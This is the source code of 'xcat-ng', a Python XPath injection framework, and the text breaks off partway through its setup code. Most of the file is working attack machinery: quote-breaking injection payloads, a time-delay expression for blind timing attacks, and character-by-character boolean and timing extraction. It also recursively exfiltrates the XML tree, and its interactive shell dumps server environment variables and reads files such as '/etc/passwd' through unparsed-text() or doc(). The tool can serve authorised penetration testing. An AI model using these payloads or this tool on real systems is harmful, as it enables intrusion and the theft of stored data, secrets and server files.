#!/usr/bin/env python3
"""xcat-ng  --  Modern XPath Injection Framework (next-generation)"""

from __future__ import annotations

import argparse
import asyncio
import collections
import hashlib
import importlib.util
import math
import re
import readline  # noqa: F401  (enables history in shell)
import shlex
import statistics
import sys
from dataclasses import dataclass, field
from enum import Enum
from pathlib import Path
from typing import Any, Callable, Dict, List, Optional, Tuple
from urllib.parse import parse_qs, urlparse

import difflib

try:
    import httpx
except ImportError:
    sys.exit("[!] Missing dependency: pip install httpx")


# ══════════════════════════════════════════════════════════════════════════════
# Terminal colours
# ══════════════════════════════════════════════════════════════════════════════

class T:
    RESET   = "\033[0m"
    BOLD    = "\033[1m"
    DIM     = "\033[2m"
    RED     = "\033[91m"
    GREEN   = "\033[92m"
    YELLOW  = "\033[93m"
    BLUE    = "\033[94m"
    CYAN    = "\033[96m"
    GRAY    = "\033[90m"


def _c(text: str, *codes: str) -> str:
    if not sys.stdout.isatty():
        return text
    return "".join(codes) + text + T.RESET


def info(m: str):  print(_c(f"[*] {m}", T.BLUE))
def ok(m: str):    print(_c(f"[+] {m}", T.GREEN))
def warn(m: str):  print(_c(f"[!] {m}", T.YELLOW))
def err(m: str):   print(_c(f"[-] {m}", T.RED))

_verbose = False
def dbg(m: str):
    if _verbose:
        print(_c(f"[DBG] {m}", T.GRAY))


BANNER = (
    _c("""
 ██╗  ██╗ ██████╗ █████╗ ████████╗      ███╗   ██╗ ██████╗
 ╚██╗██╔╝██╔════╝██╔══██╗╚══██╔══╝      ████╗  ██║██╔════╝
  ╚███╔╝ ██║     ███████║   ██║   █████╗██╔██╗ ██║██║  ███╗
  ██╔██╗ ██║     ██╔══██║   ██║   ╚════╝██║╚██╗██║██║   ██║
 ██╔╝ ██╗╚██████╗██║  ██║   ██║         ██║ ╚████║╚██████╔╝
 ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝   ╚═╝         ╚═╝  ╚═══╝ ╚═════╝
""", T.CYAN, T.BOLD) +
    _c(" Modern XPath Injection Framework  (next-generation)\n", T.YELLOW)
)


# ══════════════════════════════════════════════════════════════════════════════
# Constants
# ══════════════════════════════════════════════════════════════════════════════

DEFAULT_TIMEOUT     = 15
DEFAULT_CONCURRENCY = 10
BASELINE_SAMPLES    = 5
FAST_MODE_LEN       = 15
MISSING_CHAR        = "?"

# Frequency-ordered charset: most common English chars first → fewer requests.
# Apostrophe excluded from CHARSET_FREQ — it breaks XPath substring-before() queries.
# The linear scanner handles it separately via quote-swapping.
CHARSET_FREQ = (
    "etaoinshrdlcumwfgypbvkjxqz"
    "ETAOINSHRDLCUMWFGYPBVKJXQZ"
    "0123456789"
    "_-. {}@/!#$%^&*()+=[]:;,<>?|"
)
# Full charset for linear scan only (apostrophe safe here via quote-swap logic)
CHARSET_LINEAR = CHARSET_FREQ + "'"

# XPath expression that takes a long time to evaluate (used for time detection)
TIME_BOMB = "count((//.)[count((//.)[count((//.))>0])])"


# ══════════════════════════════════════════════════════════════════════════════
# Injection templates
# ══════════════════════════════════════════════════════════════════════════════

@dataclass(frozen=True)
class Injector:
    """
    Wraps an arbitrary XPath condition into a working injection payload.
      TRUE  response:  pre  + condition + suf
      FALSE response:  false_pre + "1=2" + false_suf
    """
    name:       str
    example:    str
    pre:        str
    suf:        str
    false_pre:  str = ""
    false_suf:  str = ""

    def wrap(self, condition: str) -> str:
        return f"{self.pre}{condition}{self.suf}"

    def false_payload(self) -> str:
        fp = self.false_pre or self.pre
        fs = self.false_suf or self.suf
        return f"{fp}1=2{fs}"

    def true_payload(self) -> str:
        return self.wrap("1=1")


INJECTORS: List[Injector] = [
    Injector(
        name="string - single quote",
        example="/lib/book[name='?']",
        pre="' or (", suf=") and '1'='1",
        false_pre="' and (", false_suf=") and '1'='1",
    ),
    Injector(
        name="string - single quote (trailing close)",
        example="/lib/book[name='?')]",
        pre="') or (", suf=") and ('1'='1",
        false_pre="') and (", false_suf=") and ('1'='1",
    ),
    Injector(
        name="string - double quote",
        example='/lib/book[name="?"]',
        pre='" or (', suf=') and "1"="1',
        false_pre='" and (', false_suf=') and "1"="1',
    ),
    Injector(
        name="string - double quote (trailing close)",
        example='/lib/book[name="?")]',
        pre='") or (', suf=') and ("1"="1',
        false_pre='") and (', false_suf=') and ("1"="1',
    ),
    Injector(
        name="integer",
        example="/lib/book[id=?]",
        pre="0 or (", suf=") and 1=1",
        false_pre="0 and (", false_suf=") and 1=1",
    ),
    Injector(
        name="integer (comment)",
        example="/lib/book[id=?] --",
        pre="0 or (", suf=") --",
        false_pre="0 and (", false_suf=") --",
    ),
    Injector(
        name="attribute name - prefix",
        example="/lib/book[?=value]",
        pre="1=1 and ", suf="",
        false_pre="1=2 and ", false_suf="",
    ),
    Injector(
        name="element name - postfix",
        example="/lib/?something",
        pre="", suf="[true()]",
        false_pre="", false_suf="[false()]",
    ),
    Injector(
        name="function call - single quote",
        example="/lib/something[function(?)]",
        pre="invalid' or (", suf=") and '1'='1",
        false_pre="invalid' and (", false_suf=") and '1'='1",
    ),
    Injector(
        name="function call - double quote",
        example='/lib/something[function(?)]',
        pre='invalid" or (', suf=') and "1"="1',
        false_pre='invalid" and (', false_suf=') and "1"="1',
    ),
]


# ══════════════════════════════════════════════════════════════════════════════
# Features
# ══════════════════════════════════════════════════════════════════════════════

@dataclass(frozen=True)
class Feature:
    name:        str
    test_expr:   str   # XPath that returns true if feature is available
    description: str = ""


FEATURES: List[Feature] = [
    Feature("xpath-2",               "lower-case('A')='a'",
            "XPath 2.0 support"),
    Feature("xpath-3",               "boolean(generate-id(/))",
            "XPath 3.0 support"),
    Feature("normalize-space",       "normalize-space(' a b ')='a b'",
            "normalize-space() available"),
    Feature("substring-search",      "contains('hello','ell')",
            "contains() available"),
    Feature("codepoint-search",      "string-to-codepoints('a')[1]=97",
            "string-to-codepoints() / XPath 2.0 binary char search"),
    Feature("environment-variables", "exists(available-environment-variables())",
            "available-environment-variables()"),
    Feature("document-uri",          "document-uri(/) != ''",
            "document-uri() available"),
    Feature("base-uri",              "base-uri() != ''",
            "base-uri() available"),
    Feature("current-datetime",      "string(current-dateTime()) != ''",
            "current-dateTime() available"),
    Feature("unparsed-text",         "unparsed-text-available(document-uri(/))",
            "unparsed-text() / file reading"),
    Feature("doc-function",          "doc-available(document-uri(/))",
            "doc() available"),
    Feature("linux",                 "unparsed-text-available('/etc/passwd')",
            "Linux OS (readable /etc/passwd)"),
]


# ══════════════════════════════════════════════════════════════════════════════
# Request parsing
# ══════════════════════════════════════════════════════════════════════════════

@dataclass
class ParsedRequest:
    method:  str
    url:     str
    headers: Dict[str, str]
    query:   Dict[str, str]
    body:    Dict[str, str]

    @property
    def all_params(self) -> Dict[str, str]:
        return {**self.query, **self.body}

    @classmethod
    def from_burp(cls, path: str) -> "ParsedRequest":
        text  = Path(path).read_text(errors="replace")
        lines = text.splitlines()

        m = re.match(r"^(\w+)\s+(\S+)\s+HTTP/", lines[0])
        if not m:
            sys.exit(f"[-] Cannot parse Burp request line: {lines[0]!r}")

        method, path_qs = m.group(1).upper(), m.group(2)
        headers: Dict[str, str] = {}
        i = 1
        while i < len(lines) and lines[i].strip():
            if ":" in lines[i]:
                k, _, v = lines[i].partition(":")
                headers[k.strip()] = v.strip()
            i += 1
        raw_body = "\n".join(lines[i + 1:]).strip()

        host   = headers.get("Host", "localhost")
        scheme = "https" if "443" in host else "http"
        full   = f"{scheme}://{host}{path_qs}"
        parsed = urlparse(full)
        query  = {k: v[0] for k, v in parse_qs(parsed.query, keep_blank_values=True).items()}

        body: Dict[str, str] = {}
        ct = headers.get("Content-Type", "")
        if raw_body and "application/x-www-form-urlencoded" in ct:
            body = {k: v[0] for k, v in parse_qs(raw_body, keep_blank_values=True).items()}

        for drop in ("Accept-Encoding", "Content-Length", "If-None-Match"):
            headers.pop(drop, None)

        base = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        return cls(method=method, url=base, headers=headers, query=query, body=body)

    @classmethod
    def from_args(cls, url: str, method: str,
                  params: Dict[str, str], headers: Dict[str, str],
                  body: Dict[str, str]) -> "ParsedRequest":
        parsed = urlparse(url)
        query  = {k: v[0] for k, v in parse_qs(parsed.query, keep_blank_values=True).items()}
        query.update(params)
        base   = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        return cls(method=method, url=base, headers=headers, query=query, body=body)


# ══════════════════════════════════════════════════════════════════════════════
# Attack context
# ══════════════════════════════════════════════════════════════════════════════

@dataclass
class AttackContext:
    req:          ParsedRequest
    target_param: str
    match_fn:     Callable[[int, str], bool]
    concurrency:  int
    fast_mode:    bool
    timeout:      int
    proxy:        Optional[str]
    injector:     Optional[Injector]          = None
    tamper_fn:    Optional[Callable]          = None
    features:     Dict[str, bool]             = field(default_factory=dict)
    char_freq:    collections.Counter         = field(default_factory=collections.Counter)
    common_strs:  collections.Counter         = field(default_factory=collections.Counter)
    _client:      Optional[httpx.AsyncClient] = field(default=None, repr=False)
    _sem:         Optional[asyncio.Semaphore] = field(default=None, repr=False)

    async def start(self):
        proxies = {"all://": self.proxy} if self.proxy else None
        self._client = httpx.AsyncClient(
            timeout=self.timeout, verify=False, proxies=proxies
        )
        self._sem = asyncio.Semaphore(self.concurrency)

    async def close(self):
        if self._client:
            await self._client.aclose()

    @property
    def working_value(self) -> str:
        return self.req.all_params.get(self.target_param, "")

    def inject(self, condition: str) -> str:
        if self.injector:
            return self.injector.wrap(condition)
        return condition

    def has(self, feat: str) -> bool:
        return self.features.get(feat, False)

    def ordered_charset(self) -> str:
        seen = sorted(self.char_freq.keys(), key=lambda c: -self.char_freq[c])
        tail = [c for c in CHARSET_FREQ if c not in self.char_freq]
        return "".join(seen) + "".join(tail)


# ══════════════════════════════════════════════════════════════════════════════
# HTTP engine
# ══════════════════════════════════════════════════════════════════════════════

class Engine:
    def __init__(self, ctx: AttackContext):
        self.ctx = ctx

    async def _send(self, overrides: Dict[str, str]) -> Tuple[int, str, float]:
        import random
        ctx = self.ctx
        req = ctx.req

        q = dict(req.query)
        b = dict(req.body)
        for k, v in overrides.items():
            if k in q:
                q[k] = v
            else:
                b[k] = v
        q["_x"] = str(random.randint(10000, 99999))

        kw: Dict[str, Any] = dict(headers=req.headers)
        if req.method.upper() in ("GET", "DELETE", "HEAD"):
            kw["params"] = q
        else:
            kw["data"] = {**q, **b} if b else q

        if ctx.tamper_fn:
            ctx.tamper_fn(ctx, kw)

        async with ctx._sem:
            try:
                r = await ctx._client.request(req.method, req.url, **kw)
                if r.status_code == 429:
                    await asyncio.sleep(3)
                    r = await ctx._client.request(req.method, req.url, **kw)
                return r.status_code, r.text, r.elapsed.total_seconds()
            except Exception as exc:
                dbg(f"Request error: {exc}")
                return 0, "", 0.0

    async def baseline(self) -> Tuple[int, str]:
        st, body, _ = await self._send({})
        return st, body

    async def send_condition(self, condition: str) -> Tuple[int, str, float]:
        payload = self.ctx.inject(condition)
        return await self._send({self.ctx.target_param: payload})

    async def send_payload(self, param: str, payload: str) -> Tuple[int, str, float]:
        return await self._send({param: payload})

    async def check(self, condition: str) -> bool:
        st, body, _ = await self.send_condition(condition)
        return self.ctx.match_fn(st, body)


# ══════════════════════════════════════════════════════════════════════════════
# Utilities
# ══════════════════════════════════════════════════════════════════════════════

def _entropy(text: str) -> float:
    if not text:
        return 0.0
    freq = collections.Counter(text)
    n = len(text)
    return -sum((c / n) * math.log2(c / n) for c in freq.values())


def _similarity(a: str, b: str) -> float:
    return difflib.SequenceMatcher(None, a, b).ratio()


def _progress(label: str, done: int, total: int, partial: str):
    """Live progress bar on stderr — keeps stdout clean for XML output."""
    bar_w  = 24
    filled = int(bar_w * done / total) if total else 0
    bar    = "█" * filled + "░" * (bar_w - filled)
    line   = (
        f"\r  {T.GRAY}{label:<22}{T.RESET} "
        f"[{T.CYAN}{bar}{T.RESET}] {done}/{total}  "
        f"{T.GREEN}{partial}{T.RESET}"
    )
    print(line, end="", flush=True, file=sys.stderr)


# ══════════════════════════════════════════════════════════════════════════════
# Detection (Normal → Boolean → Time)
# ══════════════════════════════════════════════════════════════════════════════

class ExtractionMethod(str, Enum):
    NORMAL  = "normal"
    BOOLEAN = "boolean"
    TIME    = "time"


async def _build_baseline(engine: Engine, n: int = BASELINE_SAMPLES) -> List[str]:
    results = await asyncio.gather(*[engine.baseline() for _ in range(n)])
    return [body for _, body in results]


async def _try_normal(
    engine: Engine, param: str, inj: Injector, baseline: List[str]
) -> Optional[str]:
    """
    Send a true payload and try to extract data directly from the response.
    Fastest method — no oracle required.
    """
    _, body, _ = await engine.send_payload(param, inj.true_payload())
    _, base    = await engine.baseline()

    for pat in [
        r"<value[^>]*>([^<]+)</value>",
        r"<result[^>]*>([^<]+)</result>",
        r"<text[^>]*>([^<]+)</text>",
        r"<data[^>]*>([^<]+)</data>",
        r'"result"\s*:\s*"([^"]+)"',
        r'"value"\s*:\s*"([^"]+)"',
        r'"data"\s*:\s*"([^"]+)"',
    ]:
        m = re.search(pat, body, re.IGNORECASE)
        if m:
            return m.group(1)

    base_lines = set(base.splitlines())
    extra = [l.strip() for l in body.splitlines()
             if l.strip() and l.strip() not in base_lines and len(l.strip()) > 3]
    if extra:
        return "\n".join(extra[:20])

    return None


async def _test_boolean(
    engine: Engine, param: str, inj: Injector, baseline: List[str]
) -> bool:
    """Return True if this injector reliably separates true vs false responses."""
    _, h_true,  _ = await engine.send_payload(param, inj.true_payload())
    _, h_false, _ = await engine.send_payload(param, inj.false_payload())

    score = 0
    if abs(len(h_true) - len(h_false)) > 10:                         score += 1
    if abs(_entropy(h_true) - _entropy(h_false)) > 0.3:              score += 1
    if h_true != h_false:                                             score += 1
    avg_sim_true  = sum(_similarity(b, h_true)  for b in baseline) / len(baseline)
    avg_sim_false = sum(_similarity(b, h_false) for b in baseline) / len(baseline)
    if avg_sim_true > avg_sim_false + 0.05:                          score += 1

    dbg(f"  boolean score={score} inj={inj.name!r}")
    return score >= 2


async def _test_time(
    engine: Engine, param: str, inj: Injector
) -> Optional[float]:
    """Return timing threshold if time-based injection confirmed, else None."""
    bomb = inj.true_payload().replace("1=1", f"1=1 and {TIME_BOMB}>0")
    false_pl = inj.false_payload()

    true_times, false_times = [], []
    for _ in range(3):
        _, _, t = await engine.send_payload(param, bomb)
        true_times.append(t)
        _, _, t = await engine.send_payload(param, false_pl)
        false_times.append(t)

    mean_t = statistics.mean(true_times)
    mean_f = statistics.mean(false_times)
    std_f  = statistics.pstdev(false_times) or 0.001
    z      = (mean_t - mean_f) / std_f
    dbg(f"  time z={z:.2f} mean_t={mean_t:.2f} mean_f={mean_f:.2f} inj={inj.name!r}")
    return (mean_t + mean_f) / 2 if z > 3 else None


async def detect_injection(
    engine: Engine, param: str, baseline: List[str]
) -> Optional[Tuple[ExtractionMethod, Injector, Any]]:
    """
    Try all injectors on a single parameter.
    Detection order: Normal → Boolean → Time.
    Returns (method, injector, extra) where extra is the normal-extracted
    value for NORMAL mode, or the timing threshold (float) for TIME mode.
    """
    bool_hits: List[Injector] = []

    for inj in INJECTORS:
        # 1) Normal: fastest, try first
        val = await _try_normal(engine, param, inj, baseline)
        if val:
            dbg(f"  normal hit inj={inj.name!r}")
            return ExtractionMethod.NORMAL, inj, val

        # 2) Boolean: reliable blind extraction
        if await _test_boolean(engine, param, inj, baseline):
            bool_hits.append(inj)

    if bool_hits:
        return ExtractionMethod.BOOLEAN, bool_hits[0], None

    # 3) Time: last resort, expensive
    for inj in INJECTORS:
        threshold = await _test_time(engine, param, inj)
        if threshold is not None:
            return ExtractionMethod.TIME, inj, threshold

    return None


async def auto_discover(
    engine: Engine, baseline: List[str]
) -> Optional[Tuple[str, ExtractionMethod, Injector, Any]]:
    """Iterate all parameters until an injection point is found."""
    params = engine.ctx.req.all_params
    # Prefer string parameters over numeric ones
    ranked = sorted(params.keys(), key=lambda k: (params[k].isdigit(), -len(params[k])))

    for param in ranked:
        info(f"Probing parameter: {_c(param, T.CYAN)}")
        result = await detect_injection(engine, param, baseline)
        if result:
            method, inj, extra = result
            return param, method, inj, extra

    return None


# ══════════════════════════════════════════════════════════════════════════════
# Feature detection
# ══════════════════════════════════════════════════════════════════════════════

async def detect_features(engine: Engine) -> Dict[str, bool]:
    results: Dict[str, bool] = {}

    async def probe(feat: Feature):
        try:
            results[feat.name] = await engine.check(feat.test_expr)
        except Exception:
            results[feat.name] = False

    await asyncio.gather(*[probe(f) for f in FEATURES])

    for feat in FEATURES:
        val  = results.get(feat.name, False)
        icon = _c("✓", T.GREEN) if val else _c("✗", T.RED)
        print(f"  {icon} {feat.name:<32} {_c(feat.description, T.GRAY)}")

    return results


# ══════════════════════════════════════════════════════════════════════════════
# Binary search
# ══════════════════════════════════════════════════════════════════════════════

async def binary_search(engine: Engine, expr: str, lo: int = 0, hi: int = 50) -> int:
    """Find the integer value of a numeric XPath expression."""
    if await engine.check(f"({expr}) > {hi}"):
        return await binary_search(engine, expr, lo, hi * 2)
    while lo <= hi:
        mid = (lo + hi) // 2
        if await engine.check(f"({expr}) < {mid}"):
            hi = mid - 1
        elif await engine.check(f"({expr}) > {mid}"):
            lo = mid + 1
        else:
            return mid
    return -1


# ══════════════════════════════════════════════════════════════════════════════
# Character extraction
# ══════════════════════════════════════════════════════════════════════════════

async def _char_codepoint(engine: Engine, pos_expr: str) -> Optional[str]:
    """O(log N) binary search via string-to-codepoints (XPath 2.0)."""
    code = await binary_search(engine, f"string-to-codepoints({pos_expr})[1]", lo=32, hi=126)
    return chr(code) if 32 <= code <= 126 else None


async def _char_substring(engine: Engine, pos_expr: str) -> Optional[str]:
    """O(log N) binary search via substring-before on CHARSET_FREQ."""
    space = CHARSET_FREQ
    if await engine.check(f"{pos_expr}='{space[0]}'"):
        return space[0]
    idx = await binary_search(
        engine,
        f"string-length(substring-before('{space}',{pos_expr}))",
        lo=0, hi=len(space)
    )
    return space[idx] if 0 < idx < len(space) else None


async def _char_linear(engine: Engine, pos_expr: str, ctx: AttackContext) -> Optional[str]:
    """O(N) frequency-ordered linear scan (full charset including apostrophe)."""
    charset = sorted(CHARSET_LINEAR, key=lambda c: -ctx.char_freq.get(c, 0))
    for ch in charset:
        q = '"' if ch == "'" else "'"
        if await engine.check(f"{pos_expr}={q}{ch}{q}"):
            ctx.char_freq[ch] += 1
            return ch
    return None


async def get_char(engine: Engine, expr: str, pos: int) -> Optional[str]:
    ctx      = engine.ctx
    pos_expr = f"substring({expr},{pos},1)"
    if ctx.has("codepoint-search"):
        return await _char_codepoint(engine, pos_expr)
    if ctx.has("substring-search"):
        return await _char_substring(engine, pos_expr)
    return await _char_linear(engine, pos_expr, ctx)


# ══════════════════════════════════════════════════════════════════════════════
# String extraction — boolean mode
# ══════════════════════════════════════════════════════════════════════════════

async def get_string(engine: Engine, expr: str,
                     label: Optional[str] = None,
                     fast: bool = False) -> str:
    """
    Extract the string value of an XPath expression character by character.
    Displays a live progress bar on stderr while working.
    Returns the extracted string (with MISSING_CHAR placeholders for unknowns).
    """
    ctx = engine.ctx
    work = f"normalize-space({expr})" if ctx.has("normalize-space") else expr

    total = await binary_search(engine, f"string-length({work})", lo=0, hi=50)
    if total <= 0:
        return ""

    # Try cached common strings first (avoids char-by-char for known values)
    candidates = [s for s, _ in ctx.common_strs.most_common() if len(s) == total][:5]
    if candidates:
        hits = await asyncio.gather(*[engine.check(f"{work}='{c}'") for c in candidates])
        for hit, s in zip(hits, candidates):
            if hit:
                ctx.common_strs[s] += 1
                return s

    fetch_len = min(FAST_MODE_LEN, total) if fast else total
    lbl       = (label or expr.split("(")[0][:18])

    chars = [MISSING_CHAR] * fetch_len
    done  = [0]

    async def fetch(pos: int):
        ch = await get_char(engine, work, pos)
        chars[pos - 1] = ch or MISSING_CHAR
        done[0] += 1
        _progress(lbl, done[0], fetch_len, "".join(chars))

    await asyncio.gather(*[fetch(i) for i in range(1, fetch_len + 1)])
    print(file=sys.stderr)  # newline after progress bar

    result = "".join(chars)
    if fast and fetch_len < total:
        result += f"... (+{total - fetch_len})"
    elif total <= 12:
        ctx.common_strs[result] += 1

    return result


async def get_count(engine: Engine, expr: str) -> int:
    return await binary_search(engine, f"count({expr})", lo=0)


# ══════════════════════════════════════════════════════════════════════════════
# String extraction — time-based mode
# ══════════════════════════════════════════════════════════════════════════════

async def get_string_time(engine: Engine, expr: str,
                          threshold: float, fast: bool = False) -> str:
    """Extract a string using a timing oracle."""
    ctx = engine.ctx

    # Estimate string length
    total = 0
    for length in range(1, 65):
        bomb = f"string-length({expr}) >= {length} and {TIME_BOMB}>0"
        _, _, t = await engine.send_condition(bomb)
        if t < threshold:
            total = length - 1
            break
    if total == 0:
        total = 10

    fetch_len = min(FAST_MODE_LEN, total) if fast else total
    chars: List[str] = []

    for pos in range(1, fetch_len + 1):
        found = False
        for ch in ctx.ordered_charset():
            q    = '"' if ch == "'" else "'"
            bomb = f"substring({expr},{pos},1)={q}{ch}{q} and {TIME_BOMB}>0"
            _, _, t = await engine.send_condition(bomb)
            if t >= threshold:
                chars.append(ch)
                ctx.char_freq[ch] += 1
                found = True
                break
        if not found:
            chars.append(MISSING_CHAR)
        _progress(expr[:18], pos, fetch_len, "".join(chars))

    print(file=sys.stderr)
    result = "".join(chars)
    if fast and fetch_len < total:
        result += f"... (+{total - fetch_len})"
    return result


# ══════════════════════════════════════════════════════════════════════════════
# XML tree exfiltration with live output
# ══════════════════════════════════════════════════════════════════════════════

async def exfiltrate_node(
    engine:       Engine,
    xpath:        str,
    depth:        int = 0,
    max_depth:    int = 12,
    max_children: int = 40,
    xml_lines:    Optional[List[str]] = None,
    method:       ExtractionMethod = ExtractionMethod.BOOLEAN,
    threshold:    float = 0.0,
    fast:         bool = False,
) -> None:
    """
    Recursively extract an XML node and its subtree.
    Each tag and value is printed to stdout immediately when found (live output).
    All lines are also accumulated in xml_lines for the final summary.
    Progress bars are shown on stderr.
    """
    indent = "  " * depth
    ctx    = engine.ctx

    async def gs(expr: str, lbl: str = "") -> str:
        if method == ExtractionMethod.TIME:
            return await get_string_time(engine, expr, threshold, fast or ctx.fast_mode)
        return await get_string(engine, expr, label=lbl or expr[:18], fast=fast or ctx.fast_mode)

    # Extract node name
    name = await gs(f"name({xpath})", lbl="name")
    if not name:
        name = f"node_{depth}"

    # Extract attributes
    attr_count = await get_count(engine, f"{xpath}/@*")
    attrs: Dict[str, str] = {}
    for ai in range(1, attr_count + 1):
        aname = await gs(f"name(({xpath}/@*)[{ai}])", lbl="@name")
        aval  = await gs(f"string(({xpath}/@*)[{ai}])", lbl="@val")
        if aname:
            attrs[aname] = aval

    attr_str = " ".join(f'{k}="{v}"' for k, v in attrs.items())
    open_tag = f"{indent}<{name}{' ' + attr_str if attr_str else ''}>"

    # Print open tag immediately as soon as name is known
    print(_c(open_tag, T.CYAN))
    if xml_lines is not None:
        xml_lines.append(open_tag)

    n_children = await get_count(engine, f"{xpath}/*")

    if n_children == 0 or depth >= max_depth:
        # Leaf: extract text value
        value = await gs(f"string({xpath})", lbl=name[:18])
        if value:
            val_line = f"{indent}  {value}"
            print(_c(val_line, T.GREEN))
            if xml_lines is not None:
                xml_lines.append(val_line)
    else:
        n_children = min(n_children, max_children)
        for i in range(1, n_children + 1):
            await exfiltrate_node(
                engine, f"({xpath}/*)[{i}]",
                depth + 1, max_depth, max_children,
                xml_lines, method, threshold, fast,
            )

    close_tag = f"{indent}</{name}>"
    print(_c(close_tag, T.CYAN))
    if xml_lines is not None:
        xml_lines.append(close_tag)


# ══════════════════════════════════════════════════════════════════════════════
# Interactive shell
# ══════════════════════════════════════════════════════════════════════════════

SHELL_HELP = f"""
{_c("xcat-ng interactive shell", T.BOLD)}

  {_c("get  <xpath>", T.CYAN)}         Extract string value of any XPath expression
  {_c("count <xpath>", T.CYAN)}        Count nodes matching expression
  {_c("xml  [xpath]", T.CYAN)}         Dump XML subtree (default: /*)
  {_c("env  [name]", T.CYAN)}          List env vars or get a specific one by name
  {_c("file <path>", T.CYAN)}          Read a file via unparsed-text() or doc()
  {_c("pwd", T.CYAN)}                  Print server working directory
  {_c("time", T.CYAN)}                 Print server date/time
  {_c("find <name>", T.CYAN)}          Search for a file in parent directories
  {_c("features", T.CYAN)}             Show all detected feature flags
  {_c("toggle <feature>", T.CYAN)}     Toggle a feature on/off manually
  {_c("help", T.CYAN)}                 Show this message
  {_c("exit / quit", T.CYAN)}          Exit the shell
"""


async def shell_loop(engine: Engine, method: ExtractionMethod, threshold: float):
    ctx = engine.ctx
    print(SHELL_HELP)

    async def gs(expr: str, lbl: str = "") -> str:
        if method == ExtractionMethod.TIME:
            return await get_string_time(engine, expr, threshold, ctx.fast_mode)
        return await get_string(engine, expr, label=lbl or expr[:18], fast=ctx.fast_mode)

    while True:
        try:
            line = input(f"{_c('XCat', T.RED)}{_c('$ ', T.GREEN)}").strip()
        except (EOFError, KeyboardInterrupt):
            print()
            break
        if not line:
            continue
        parts = shlex.split(line)
        cmd, args = parts[0].lower(), parts[1:]

        try:
            if cmd in ("exit", "quit"):
                break

            elif cmd == "help":
                print(SHELL_HELP)

            elif cmd == "get":
                if not args:
                    err("Usage: get <xpath>"); continue
                print(_c(await gs(args[0]), T.GREEN))

            elif cmd == "count":
                if not args:
                    err("Usage: count <xpath>"); continue
                n = await get_count(engine, args[0])
                print(_c(str(n), T.GREEN))

            elif cmd == "xml":
                xpath     = args[0] if args else "/*"
                xml_lines: List[str] = []
                await exfiltrate_node(engine, xpath,
                                      xml_lines=xml_lines,
                                      method=method, threshold=threshold,
                                      fast=ctx.fast_mode)
                print()
                print(_c("═" * 64, T.BOLD))
                for ln in xml_lines:
                    s = ln.strip()
                    print(_c(ln, T.CYAN) if s.startswith("<") else _c(ln, T.GREEN))
                print(_c("═" * 64, T.BOLD))

            elif cmd == "env":
                if not ctx.has("environment-variables"):
                    warn("Feature 'environment-variables' not available"); continue
                if args:
                    print(_c(await gs(f'environment-variable("{args[0]}")', lbl="env"), T.GREEN))
                else:
                    cnt = await get_count(engine, "available-environment-variables()")
                    for i in range(1, cnt + 1):
                        name  = await gs(f"available-environment-variables()[{i}]", lbl="env-name")
                        value = await gs(f'environment-variable("{name}")', lbl="env-val")
                        print(f"{_c(name, T.CYAN)}={_c(value, T.GREEN)}")

            elif cmd == "file":
                if not args:
                    err("Usage: file <path>"); continue
                if ctx.has("unparsed-text"):
                    expr = f'unparsed-text("{args[0]}")'
                elif ctx.has("doc-function"):
                    expr = f'string(doc("{args[0]}"))'
                else:
                    warn("Neither unparsed-text nor doc() available"); continue
                print(_c(await gs(expr, lbl="file"), T.GREEN))

            elif cmd == "pwd":
                if ctx.has("base-uri"):
                    print(_c(await gs("base-uri()"), T.GREEN))
                elif ctx.has("document-uri"):
                    print(_c(await gs("document-uri(/)"), T.GREEN))
                else:
                    warn("Neither base-uri nor document-uri available")

            elif cmd == "time":
                if not ctx.has("current-datetime"):
                    warn("Feature 'current-datetime' not available"); continue
                print(_c(await gs("string(current-dateTime())"), T.GREEN))

            elif cmd == "find":
                if not args:
                    err("Usage: find <filename>"); continue
                for i in range(10):
                    rel = ("../" * i) + args[0]
                    if ctx.has("doc-function"):
                        if await engine.check(
                            f"doc-available(resolve-uri('{rel}',document-uri(/)))"
                        ):
                            ok(f"[XML] {rel}")
                    if ctx.has("unparsed-text"):
                        if await engine.check(
                            f"unparsed-text-available(resolve-uri('{rel}',document-uri(/)))"
                        ):
                            ok(f"[TXT] {rel}")

            elif cmd == "features":
                for k, v in ctx.features.items():
                    icon = _c("on", T.GREEN) if v else _c("off", T.RED)
                    print(f"  {k:<34} {icon}")

            elif cmd == "toggle":
                if not args:
                    err("Usage: toggle <feature>"); continue
                f = args[0]
                ctx.features[f] = not ctx.features.get(f, False)
                icon = _c("on", T.GREEN) if ctx.features[f] else _c("off", T.RED)
                print(f"{f} → {icon}")

            else:
                err(f"Unknown command '{cmd}'. Type 'help'.")

        except KeyboardInterrupt:
            print()
        except Exception as exc:
            err(f"Error: {exc}")
            if _verbose:
                import traceback; traceback.print_exc()


# ══════════════════════════════════════════════════════════════════════════════
# Shared setup
# ══════════════════════════════════════════════════════════════════════════════

def build_match_fn(args: argparse.Namespace) -> Callable[[int, str], bool]:
    ts = getattr(args, "true_string",  None)
    tc = getattr(args, "true_code",    None)
    fs = getattr(args, "false_string", None)
    fc = getattr(args, "false_code",   None)

    ts_neg = tc_neg = False
    if ts and ts.startswith("!"):
        ts_neg = True; ts = ts[1:]
    if tc and str(tc).startswith("!"):
        tc_neg = True; tc = int(str(tc)[1:])
    tc_int = int(tc) if tc else None
    fc_int = int(fc) if fc else None

    def fn(status: int, body: str) -> bool:
        if ts:
            found = ts in body
            if (found ^ ts_neg) is False:
                return False
        if tc_int is not None:
            match = (status == tc_int)
            if (match ^ tc_neg) is False:
                return False
        if fs and fs in body:
            return False
        if fc_int and status == fc_int:
            return False
        return True

    return fn


def build_context(args: argparse.Namespace) -> AttackContext:
    if getattr(args, "request", None):
        req = ParsedRequest.from_burp(args.request)
    elif getattr(args, "url", None):
        headers: Dict[str, str] = {}
        for h in (getattr(args, "header", None) or []):
            if ":" in h:
                k, _, v = h.partition(":")
                headers[k.strip()] = v.strip()
        params: Dict[str, str] = {}
        for p in (getattr(args, "param_values", None) or []):
            if "=" in p:
                k, _, v = p.partition("=")
                params[k] = v
        if getattr(args, "target_param", None):
            params.setdefault(args.target_param, "")
        body: Dict[str, str] = {}
        for b in (getattr(args, "body_param", None) or []):
            if "=" in b:
                k, _, v = b.partition("=")
                body[k] = v
        req = ParsedRequest.from_args(
            url=args.url, method=args.method,
            params=params, headers=headers, body=body
        )
    else:
        sys.exit("[-] Provide -r/--request FILE  or  --url URL")

    if not any([
        getattr(args, "true_string",  None),
        getattr(args, "true_code",    None),
        getattr(args, "false_string", None),
